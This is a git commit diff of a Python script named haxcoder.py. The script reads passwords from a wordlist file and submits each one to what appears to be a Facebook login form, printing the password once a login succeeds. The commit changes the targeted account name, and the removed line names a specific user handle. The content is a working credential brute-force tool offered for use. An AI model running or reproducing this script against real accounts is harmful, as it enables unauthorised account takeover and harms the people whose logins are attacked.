e773f2f357b449b9dd186e24becbfb53aa391e73
Haxcoder™ <77023113+Haxcodertm@users.noreply.github.com>
2021-04-25 23:05:02 +0800

    A

--- haxcoder.py
+++ haxcoder.py
@@ -5,7 +5,7 @@ arq = open ('passwords.txt', 'r').readlines()
 
 for line in arq:
 	password = line.strip()
-	https = requests.post(url, data = {'email':'rsuarez95','pass':password , 'login':'submit'})
+	https = requests.post(url, data = {'email':'haxcoder.yeah','pass':password , 'login':'submit'})
 	content = https.content
 	if "Search Facebook" in content:
 		print("============== PASSWORD IS:" +password+"==============")
